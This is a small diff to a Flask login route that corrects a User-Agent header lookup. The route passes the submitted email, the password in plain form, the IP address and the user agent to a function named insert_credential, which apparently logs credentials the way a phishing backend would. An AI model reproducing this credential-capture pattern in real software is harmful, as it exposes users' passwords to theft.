@@ -14,7 +14,7 @@ def login():
         email = request.form.get('email')
         password = request.form.get('password')
         ip = request.remote_addr
-        user_agent = request.headers.get('User_Agent')
+        user_agent = request.headers.get('User-Agent')
         timestamp = datetime.utcnow().isoformat()
 
         insert_credential(email, password, ip, user_agent, timestamp)
